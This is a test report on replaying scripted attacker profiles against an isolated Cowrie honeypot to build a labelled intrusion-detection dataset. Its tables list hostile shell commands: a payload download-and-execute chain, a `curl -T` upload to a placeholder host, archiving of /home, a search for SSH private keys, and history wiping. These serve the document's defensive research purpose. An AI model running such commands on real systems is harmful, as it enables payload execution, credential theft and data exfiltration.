# Task 13 / 13B — Isolated Cowrie smoke test for the revised V2 profiles

**Date:** 2026-11-10. **Run window:** 12:11:03–12:16:45 UTC.

**Status:** complete. **21 of 21 planned sessions completed cleanly.** Every sent command returned a prompt and
was recorded by Cowrie in order. There were no timeouts and no unmatched records.

**Not done:** no dataset was built, nothing was extracted, trained or evaluated, and there was no test-set
access. The generator, extractor, specification, profiles, Cowrie and Docker are unchanged. Nothing was committed.

This is a compatibility smoke test with 3 sessions per profile. It is **not** evidence about statistical leakage.

## Evidence (this folder)

| Path | Content |
|---|---|
| `gateway_port111_investigation.md` | Read-only investigation of the 172.22.0.1 / TCP 111 exposure (Task 13 stop) |
| `plan_smoke_sessions.py`, `configs/*.json`, `configs/session_plan.json` | Single-profile configs copied verbatim from `profiles_v2_revised.json`; pre-registered planning seeds; pacing seeds checked unused |
| `run_smoke.sh` | The exact run script; each command is echoed into `evidence/generator_console.txt` |
| `runs/<profile>/{manifest.jsonl, terminal_output.jsonl, run_meta.json}` | Complete generator output for the 7 runs |
| `analyze_smoke.py` | Manifest ↔ terminal output ↔ Cowrie reconciliation |
| `evidence/reconciliation.json`, `evidence/profile_table.json`, `evidence/command_results.json` | Per-session, per-profile and per-command results |
| `evidence/cowrie_full_after.json` | Whole `cowrie.json` after the run (963 lines); its first 535 lines hash to the baseline |
| `evidence/cowrie_smoke_slice.json` | Lines 536–963: **the 428 events of this test** |
| `evidence/cowrie_console_1211_1217.txt` | Cowrie process log for the window (`docker logs`, read-only) |
| `evidence/preflight_isolation.json`, `evidence/gateway_port111_listeners.json`, `evidence/docker_vm_iptables_save_20261110T1202Z.txt` | Isolation evidence |

## 1. Isolation, the stop, and R1 acceptance

**Task 13 stop (11:56–11:57 UTC).**
- From inside Cowrie, TCP 111 on 172.22.0.1 accepted a connection, failing the check that Cowrie cannot reach
  the host network. No traffic was generated.
- The read-only investigation (`gateway_port111_investigation.md`) established:
  - **What is listening.** 172.22.0.1 is the IPAM gateway of `cowrie_cowrie_internal`, assigned to bridge
    `br-72ab93e8020b` in the Docker Desktop VM. Docker Desktop's own NFS client services listen there on all
    interfaces: **rpcbind on TCP/UDP 111** and **rpc.statd on TCP 32775 and UDP 51113**. These are not Cowrie
    services.
  - **Why it is reachable.** `internal=true` drops traffic only in the FORWARD chain. Traffic to the bridge's own
    address is local delivery, and the VM's INPUT chain is `ACCEPT` with no rules.
  - **What still holds.** Cowrie has **no default route** (only 172.22.0.0/16), so the Internet, the Docker
    Desktop host, the other bridges and the LAN are unreachable.
  - **Cowrie's own controls.** `nc`, `wget`, `curl` and `ftpget` refuse 172.16.0.0/12 and the other private
    ranges (`BLOCKED_IPS`). SSH `direct-tcpip` forwarding is a log-only fake channel.
  - **Residual risk.** Code running with the container's real privileges, after a Cowrie, Twisted or Python
    compromise or via `docker exec`, could reach rpcbind and statd on the Docker Desktop VM.
- **R1 was explicitly approved:** the exposure is accepted as a documented residual risk for this smoke test. No
  configuration was changed. The structural fix (R2: no IPv4 address on the internal bridge) remains open.

**Corrected documentation.** `reports/cowrie_security_isolation_audit/report.md` now has:
- a dated correction block at the top: gateway 172.22.0.1, rpcbind and statd, why the gateway is reachable, no
  default route, Cowrie's command-level restrictions, the residual risk, and R1 acceptance;
- an address note (Cowrie is 172.22.0.3 and the relay 172.22.0.2 since the 09:03 re-creation);
- corrected wording in the network table and the conclusion;
- an added item under residual risks.

## 2. Preflight (Task 13B, 12:08–12:11 UTC)

| Check | Result |
|---|---|
| Full test suite | **306 passed, 5 known warnings** (185.9 s) |
| Revised profiles | `dataset_builder/profiles_v2_revised.json` SHA-256 `79d47ac48e1f4c242ffcb851c567da884df21d039cc11917dc5bf3dea761fe62`, unchanged; version `2.3.0-revised`; 7 profiles |
| Generator / extractor / specification | `generate_labelled_traffic.py` `f8c55f9d…`, `extract_features_v2.py` `c0fdc684…`, `feature_spec_v2.json` `9401b355…`, all equal to the Task 12 snapshot. Compat, isolated and original profiles are also unchanged |
| Containers | Both running on image `sha256:bf371c37…cc13a`; StartedAt 09:03:25 UTC; **RestartCount 0**; read-only root filesystem; `cap_drop ALL` |
| Configuration | `cowrie/docker-compose.yml` `67aa9e6b…`, unchanged; `cowrie_cowrie_internal` `internal=true` |
| External and host restrictions | From Cowrie, 1.1.1.1, 8.8.8.8, 192.168.65.254 and 172.21.0.1 are *Network is unreachable*; DNS fails; the routing table is only 172.22.0.0/16. These were targeted checks only: no gateway scan, no RPC |
| Exposure | `docker port cowrie-ssh-relay` → `127.0.0.1:2223` only; `cowrie-project` publishes nothing; 172.27.0.1, 192.168.56.1 and 172.20.10.5 do not accept on port 2223 |
| **Log baseline** (12:10:55 UTC) | `cowrie.json` **535 lines, 256,858 bytes, SHA-256 `c5c114dc4f0b33998a03bc48a26065a01e54ca5c17f9bd37d3b05dc7ffed752a`**; last event 11:06:52 (Task 10A) |

## 3. Seeds and exact commands

- **Profiles:** the generator has no profile filter. Each profile ran from `configs/<profile>.json`, which holds
  that one profile object copied verbatim from `profiles_v2_revised.json`, with the same placeholders and
  version. `plan_smoke_sessions.py` asserts the source hash and object equality.
- **Planning-seed rule (fixed before any session):** the smallest seed in 1..5000 whose three planned sessions
  contain each required command. Requirements: benign `curl -I`; reconnaissance `wget -qO-`, `curl -s` and
  `groups`; botnet `cd /tmp || cd /var/tmp` and `wget`; privilege escalation `groups`; lateral movement `nc -zv`
  and `ping -c`; exfiltration `curl -T`. Brute force has no requirement and uses seed 1.
- **Pacing seeds:** 9301–9307, one per run, verified unused under `dataset_builder/runs` and `reports/`
  (`find_pacing_seed_reuse`). Every `run_meta.json` records `reused_by: []`.
- **Settings:** speed 1.0, prompt timeout 20 s, generator 2.1. Pacing and readiness policies are unchanged.

| Profile | Planning seed | Pacing seed | Planned auth attempts per session | Baseline lines at start |
|---|---|---|---|---|
| benign_admin | 2 | 9301 | 1, 2, 2 | 535 |
| reconnaissance | 6 | 9302 | 2, 1, 3 | 591 |
| brute_force | 1 | 9303 | 5, 5, 5 | 656 |
| botnet | 1 | 9304 | 2, 2, 2 | 745 |
| privilege_escalation | 2 | 9305 | 1, 2, 2 | 807 |
| lateral_movement | 8 | 9306 | 1, 2, 1 | 863 |
| data_exfiltration (held out) | 1 | 9307 | 2, 2, 1 | 912 |

Exact command, per profile `<p>` with seeds `<s>`/`<ps>` from the table. Data exfiltration also adds
`--include-held-out`:

```
.venv/Scripts/python.exe -W ignore dataset_builder/generate_labelled_traffic.py \
  --config reports/revised_profile_cowrie_smoke_test/configs/<p>.json --host 127.0.0.1 --port 2223 \
  --sessions 3 --seed <s> --pacing-seed <ps> \
  --output-dir reports/revised_profile_cowrie_smoke_test/runs/<p> \
  --runs-root reports/revised_profile_cowrie_smoke_test/runs --container cowrie-project
```

The literal commands are recorded in `evidence/generator_console.txt`. All seven exited 0 with
"3/3 sessions completed cleanly".

## 4. Log baseline and final hashes

| | Lines | Bytes | SHA-256 |
|---|---|---|---|
| Before (12:10:55) | 535 | 256,858 | `c5c114dc4f0b33998a03bc48a26065a01e54ca5c17f9bd37d3b05dc7ffed752a` |
| After (12:16:45+) | 963 | 461,838 | `d59ca2d4831d2d9ce630dabbeaacaac33b6e3dac095ee570c47f8bac0e343240` |
| First 535 lines of "after" | 535 | — | `c5c114dc…752a`: **identical to the baseline**, so no earlier entry is included in the slice |
| Test slice (lines 536–963) | 428 | — | `5f9c7770a5aa3cb9ff7367914c4402035d0cabee0e21563ed532612f01e69fb0` |

- Slice time range: 12:11:04.185–12:16:44.466 UTC.
- All 428 events have `src_ip` 172.22.0.2 (the relay).
- No unrelated traffic was present, and each run's baseline equals the previous run's end.

## 5. Per-profile results

Durations come from Cowrie's `session.closed`. "tty" is Cowrie's `log.closed.size` (terminal output bytes).
Failed guesses are separate connections, all closed in 1.0–1.1 s.

| Profile | Planned / logged in / clean exit | Login attempts (success / failed) | Commands planned / sent / recorded / prompt | Timeouts / not sent | Unexpected disconnects | Session duration (s) | tty bytes | Download / transfer events |
|---|---|---|---|---|---|---|---|---|
| benign_admin | 3 / 3 / 3 | 5 (3 / 2) | 18 / 18 / 18 / 18 | 0 / 0 | 0 | 13.3, 15.8, 9.6 | 916, 1089, 867 | none (`curl -I` DNS failure) |
| reconnaissance | 3 / 3 / 3 | 6 (3 / 3) | 23 / 23 / 23 / 23 | 0 / 0 | 0 | 12.1, 12.7, 23.1 | 2043, 1637, 4341 | none (`wget -qO-` ×2, `curl -s`: DNS failure) |
| brute_force | 3 / 3 / 3 | 15 (3 / 12) | 2 / 2 / 2 / 2 | 0 / 0 | 0 | 9.0, 7.4, 1.0 | 421, 417, 315 | none |
| botnet | 3 / 3 / 3 | 6 (3 / 3) | 20 / 20 / 20 / 20 | 0 / 0 | 0 | 12.3, 16.4, 19.3 | 961, 2999, 930 | **none: all three downloads failed at DNS**; no `file_download` event |
| privilege_escalation | 3 / 3 / 3 | 5 (3 / 2) | 19 / 19 / 19 / 19 | 0 / 0 | 0 | 9.0, 29.5, 13.4 | 678, 666, 875 | none |
| lateral_movement | 3 / 3 / 3 | 4 (3 / 1) | 14 / 14 / 14 / 14 | 0 / 0 | 0 | 18.3, 11.1, 9.9 | 994, 814, 811 | none |
| data_exfiltration | 3 / 3 / 3 | 5 (3 / 2) | 14 / 14 / 14 / 14 | 0 / 0 | 0 | 13.0, 11.3, 9.9 | 827, 853, 1059 | **none: `curl -T` is an option error**; no upload event |
| **Total** | **21 / 21 / 21** | **46 (21 / 25)** | **110 / 110 / 110 / 110** | **0 / 0** | **0** | | | **0** |

- **Brute force:** the 12 rejected guesses are authentication attempts. Each is its own Cowrie session with one
  `login.failed` and no shell. They are not missing commands. Session #3 planned no command: it logged in,
  sent `exit` and closed after 1.0 s.
- **Other profiles:** the 13 rejected first attempts are the generator's planned wrong-password retries,
  matched individually.

## 6. Command-level compatibility (64 distinct commands sent)

**Focus commands, all verified against real Cowrie:**

| Command (as sent) | n | Prompt returned | Recorded | Max wait | Cowrie behaviour (stored terminal output) |
|---|---|---|---|---|---|
| `wget -qO- http://mirror.example/ip`, `…pkg-repo.example/ip` | 2 | 2 | 2 | 0.047 s | `wget: unable to resolve host address 'mirror.example'`; `-q` does not suppress this line |
| `curl -I http://files.example/` | 1 | 1 | 1 | 0.063 s | `curl: (6) Could not resolve host: files.example` |
| `curl -s http://pkg-repo.example/ip` | 1 | 1 | 1 | 0.047 s | `curl: (6) Could not resolve host: pkg-repo.example` |
| `cd /tmp \|\| cd /var/tmp` | 2 | 2 | 2 | 0.047 s | No output. The prompt ends in **`/var/tmp`**: Cowrie runs both `cd`s (`\|\|` treated as `;`) |
| `groups` (reconnaissance ×1, privilege escalation ×2) | 3 | 3 | 3 | 0.063 s | Prints the user's group (e.g. `root`) |

**Other findings from real execution**, which differ from or refine the Task 12 static classification:

| Command | Observed behaviour | Static classification (Task 12) |
|---|---|---|
| `ip a`, `arp -a` | `-bash: /sbin/ip: cannot execute binary file: Exec format error`; returns; **no** `command.failed` event | "unsupported → command not found" was **wrong**: Cowrie's fake filesystem contains these paths |
| `systemctl status ssh`, `nmap -sn 192.0.2.0/24` | `command not found`; returns; emits `cowrie.command.failed` (the run's only 4 such events) | confirmed |
| `cat /etc/sudoers` | `No such file or directory` (not in Cowrie's filesystem) | "expected returns": returns, but the content is absent |
| `tar czf /var/tmp/d.tgz /home`, `tar cf /tmp/d.tar /var/www` | `Cannot open: No such file or directory … Error is not recoverable`; **no archive is created** | "expected returns": returns, but staging fails |
| `curl -T … http://{domain\|ip}/u` | `curl: option -T not recognized`; returns; no DNS lookup, no connection | confirmed: option error, **no upload** |
| `wget http://files.example/payload`, `wget -q … -O payload` | DNS failure, `unable to resolve host address`; returns; no `file_download` / `file_download.failed` event | confirmed: network-dependent, fails |
| `chmod +x payload`, `sh payload`, `rm payload` | `No such file or directory` (the download never happened) | returns, as expected |
| `nc -zv 192.0.2.5 22` | `Connection refused`. In the source, Cowrie maps any `OSError` to this text; here the kernel's immediate "network unreachable" (no route) | network-dependent, returns |
| `ping -c 2 192.0.2.12` | `ping: bad number of packets to transmit.`; returns | known quirk, confirmed |
| `find / -name id_rsa 2>/dev/null` | Returns after **11.66 s** (Cowrie walks its whole fake filesystem); every other command took ≤ 0.063 s | returns; slow walk not predicted |
| `ls -la /var/log \| tail -n 5`, `ps aux \| grep …` and the other pipelines | Pipe executed; returns | "expected" → confirmed for the pipelines that were sent |
| `cat /etc/apt/sources.list` | Empty output; returns | — |

- **No command blocked.** The maximum readiness wait outside `find / -name id_rsa` was 0.063 s.
- **Cowrie console:** seven `DNSServerError rCode=2` (SERVFAIL) tracebacks, one per `.example` lookup
  (7 lookups = 7 tracebacks), each followed by "Attempt to access blocked network address". These are logged
  as "Unhandled Error" but are harmless: the command returned. No `ConnectingDone` or other errors appeared.

## 7. Manifest-to-Cowrie reconciliation

| Check | Result |
|---|---|
| 1. Sessions | 46 Cowrie sessions = 46 manifest authentication attempts, paired in connect order. Every pair matches on username, password and outcome (accepted ↔ `login.success`, rejected ↔ `login.failed`). **Unmatched: none** |
| 2. Login attempts | 21 `login.success` + 25 `login.failed`, matching the manifests' `auth_log` one-to-one |
| 3. Sent commands accounted for | 110 sent → 110 recorded as `command.input` (+ 21 `exit` = 131 events). `sent_but_not_recorded` and `recorded_but_not_sent` are empty in every session |
| 4. Ordering | `order_matches` true for all 21 logged-in sessions |
| 5. Unexpected commands | none (no input that was not sent) |
| 6. Readiness vs completion | Every wait ended on `prompt`, and each stored `prompt_match` matches `PROMPT_RE`. Initial shell readiness was true for all 21 sessions |
| 7. Exit and closure | `exit` sent, confirmed by the generator and recorded by Cowrie in all 21 logged-in sessions. All 46 sessions have `session.closed`; the final event of each logged-in session is `session.closed` |
| 8. No pre-existing entries | The slice starts after line 535, whose prefix hash equals the baseline. All events fall inside the run window and come from the relay |
| Terminal-output encoding | No U+FFFD and no invalid UTF-8 bytes in any stored output. `wget`'s curly quotes are stored correctly (the Task 10A fix holds) |

## 8. Profile-level observations (3 sessions each; descriptive only)

- **Shared commands produce identical event patterns.** `uname -r`, `w`, `id`, `whoami`, `groups`, `hostname`,
  `pwd`, `cat /etc/os-release` and `uname -a` were sent in two or three different profiles. Each produced one
  `command.input` and output of the same form in every profile. Only the prompt's username differs, and that
  comes from the planned credentials, not the category.
- **Terminal output is still dominated by a few profile-specific commands:** `netstat -antp` 1,905 characters
  and `cat /etc/passwd` 898 (reconnaissance), `cat /proc/cpuinfo` 1,444 and `enable` 771 (botnet).
  - Reconnaissance had the largest `tty_output_bytes`: 1,637–4,341. The other profiles ranged 666–2,999, and
    brute force 315–421.
  - Privilege escalation's commands were the tersest in this sample (median 46 characters per command):
    `find` produced little output and `cat /etc/sudoers` was missing.
  - This matches the Task 12 caveat: verbosity is an emulation property that the redesign spreads out but does
    not remove.
- **Command counts:** brute force 0–1 per session, by design. The other profiles had 4–10 per session
  (lateral movement and exfiltration 4–5, reconnaissance 5–10).
- **Durations:** logged-in sessions lasted 7.4–23.1 s, except privilege escalation #2 at 29.5 s, caused by the
  11.7 s `find / -name id_rsa`. That is a command-specific emulation latency, which could leak into
  `session_duration_s` in a larger dataset. Brute force #3 (no commands) lasted 1.0 s.
- **Early termination:** none. Every session ended with a confirmed `exit`.
- **Semantics:**
  - Botnet ran its full download → `chmod` → execute chain, but **no download occurred** (DNS failure, no
    `file_download` event), so `chmod`, `sh` and `rm` act on a missing file.
  - Data exfiltration **attempted** discovery, staging and upload. Staging failed (`tar` cannot write) and the
    upload is an option error, so **no transfer occurred**.
  - Lateral movement is **reconnaissance only**: hosts and history were read, and probes failed (`nc`
    "refused", `ping` option error, `nmap` not found). No remote host was contacted.
  - Benign stayed benign: its only network-family command, `curl -I`, failed at DNS.

## 9. Failures, blocking and limitations

- **Failures or blocking:** none. Zero timeouts, zero commands not sent, zero unexpected disconnects, zero
  unmatched records.
- **Emulation gaps that affect semantics, not compatibility:**
  - `cat /etc/sudoers` and `cat /etc/apt/sources.list` return no content;
  - `tar` cannot create archives in this Cowrie filesystem;
  - `ip` and `arp` produce "Exec format error";
  - `nc` reports "Connection refused" for an unreachable network;
  - `find / …` walks are slow (about 11.7 s). This is a candidate for a timing artefact in Dataset V2.
- **Coverage:** 64 of the roughly 220 concrete revised commands were exercised. Untested here: for example
  `ps aux | grep sshd`, `cat /etc/passwd | grep sh`, `ls -la /usr/bin | grep rws`, `cat /etc/hosts | grep -v '^#'`,
  `history -c`, `unset HISTFILE`, `curl -O`, `journalctl`, `ss`. The static classification for those remains
  unverified.
- **Sample size:** 3 sessions per profile cannot support statements about separability or leakage.
- **Residual isolation risk:** accepted under R1 (§1). The R2 structural fix is not applied.
- **Diagnostics:** `terminal_output.jsonl` is diagnostic only, not a feature source.

## 10. Recommended next step (requires approval)

1. Decide how to handle the slow `find / -name id_rsa` walk before a larger run. Options: keep it as
   realistic emulation latency and re-test C3 duration features on the generated data, or replace it with a
   bounded search in a new profile revision. Either needs approval; the profiles were not changed here.
2. Optionally, apply R2 (an internal bridge without an IPv4 address) before a long generation run.
3. With approval, generate a generator-2.1 training run with `profiles_v2_revised.json`, extract with
   `scripts/extract_features_v2.py`, and repeat the Task 11 leakage analysis (`analyze_leakage.py`).

**Stopped. Waiting for explicit approval before generating any larger training or validation dataset.**
